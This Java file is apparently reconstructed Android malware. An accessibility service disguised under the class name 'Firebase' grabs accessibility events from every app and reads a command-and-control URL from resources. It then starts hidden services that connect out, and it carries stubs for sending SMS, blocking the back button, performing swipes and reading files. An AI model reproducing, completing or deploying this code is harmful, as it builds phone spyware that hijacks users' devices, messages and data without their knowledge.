package com.android.pictach;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.os.Build;
import android.view.accessibility.AccessibilityEvent;

public class Firebase extends AccessibilityService {

    public static Boolean  FirebaseFOR_IN      = false;
    public static Boolean  FirebaseFOR_prim     = false;
    public static Boolean  Firebasebypass       = false;
    public static String   FirebaseOFK          = "on";
    public static boolean  FirebaseCheckPrims   = false;
    public static String   fileReadStatus       = "on";
    public static boolean  needPaste            = false;
    public static String   pasteText            = "";

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        // Set AccessibilityServiceInfo — APK units [3-24]
        try {
            AccessibilityServiceInfo info = new AccessibilityServiceInfo();
            info.flags            = 19;
            info.eventTypes       = 0xF;
            info.notificationTimeout = 0L;
            info.packageNames     = null;
            info.feedbackType     = 0xF;
            setServiceInfo(info);
        } catch (Exception ignored) {}

        // Set accessibility instance — APK unit [27]
        love.MyAccess = this;

        // Read C2 URL from resources — needed by Api.initializeAndConnect
        try {
            Utils.p_Utils_r = getApplicationContext().getResources()
                    .getString(R.string.newss);
        } catch (Exception ignored) {}

        // Start love service if not running — APK units [118-137]
        try {
            if (LoveApi0.isServiceNotRunning(love.class, getApplication())) {
                startService(new Intent(this, love.class));
            }
        } catch (Exception ignored) {}

        // Start myker — APK units [140-174]
        // myker.onHandleIntent sets love.allok=true, Utils.iamworking=true,
        // then starts Api — this is the correct APK flow
        try {
            Intent mykerIntent = new Intent(getApplicationContext(), myker.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(mykerIntent);
            } else {
                startService(mykerIntent);
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {}

    @Override
    public void onInterrupt() {}

    public void blockBackButton() {}
    public void goHome() {}
    public void triggerAction() {}
    public void performSwipe(String s) {}
    public void drawSwipePath(android.graphics.Point[] pts, int dur) {}
    public String readFile(String path) { return ""; }
    public static void sendSMS(String num, String msg) {}
}
